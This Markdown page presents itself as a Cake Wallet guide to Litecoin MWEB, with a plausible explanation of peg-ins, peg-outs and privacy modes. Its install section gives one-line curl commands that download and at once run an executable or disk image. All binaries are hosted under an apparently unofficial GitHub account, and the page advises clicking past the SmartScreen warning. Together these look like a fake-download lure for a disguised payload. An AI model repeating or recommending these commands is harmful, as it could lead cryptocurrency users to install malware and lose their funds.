![Cake Wallet litecoin mweb guide](assets/cake-wallet-litecoin-mweb-article-banner.png)

# Litecoin MWEB in Cake Wallet

Confidential amounts on Litecoin, and what the extension block does not hide.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

Litecoin's MWEB is an extension block with confidential amounts, and Cake Wallet supports it alongside ordinary Litecoin. Moving funds between MWEB and the public chain is a separate action from a normal send. It hides amounts, not the fact that a peg-in or peg-out happened.

<!-- ARTICLE-BODY-BEGIN -->

## What MWEB is
MimbleWimble Extension Blocks add a second layer to Litecoin where transaction amounts are hidden and history is compressed. Funds live either on the public chain or inside MWEB, and the boundary between them is crossed deliberately.

That boundary is where most confusion starts: a balance that seems to vanish is usually sitting on the other side. Check which side you are looking at before you look for a missing transaction.

## Moving funds into MWEB
Sending to your own MWEB side is a peg-in: the coins leave the public chain and appear inside the extension block. It costs a normal Litecoin fee and takes the usual confirmation time.

The reverse is a peg-out. Both are ordinary spends from the wallet's point of view, with a different destination, so there is no separate app to install. <a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-swap-crypto.md">Swap crypto in Cake Wallet</a> is the route if you hold something else and need LTC to shield in the first place.

## What MWEB hides and what it does not
Amounts inside MWEB are hidden, and the transaction graph is much harder to follow than on the transparent chain. What it does not hide is that a peg-in or peg-out occurred, and an exchange that receives a deposit learns what it needs for its own records regardless.

Privacy here is a property of where the coins sit, not of the app. The same wallet sends transparent Litecoin when you choose a public address.

## Privacy modes compared
Litecoin MWEB, Bitcoin Silent Payments and Monero solve different problems: MWEB hides amounts inside its block, Silent Payments stop address reuse, Monero hides sender, receiver and amount by default at protocol level.

Choosing between them is choosing a coin, not a setting. <a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-silent-payments.md">Silent Payments in Cake Wallet</a> covers the Bitcoin option, which changes far less about what an observer sees.

## Install a build that has it
MWEB support arrived in a specific build, and an older app will show only ordinary Litecoin addresses. Install the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">current Cake Wallet release</a> and look for the MWEB address type in the Litecoin wallet.

If the option is missing after updating, confirm you are in the Litecoin wallet and not in a token or a different coin's account.

## FAQ
### Does Cake Wallet support Litecoin MWEB?
Yes, on builds that implement it. Current releases expose an MWEB address type in the Litecoin wallet.
### Does MWEB hide that I moved funds?
No. Amounts inside MWEB are confidential, but the peg-in or peg-out itself is visible.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[Cake Wallet supported coins](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-supported-coins-networks.md) · [Silent Payments in Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-silent-payments.md) · [swap crypto in Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-swap-crypto.md) · [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
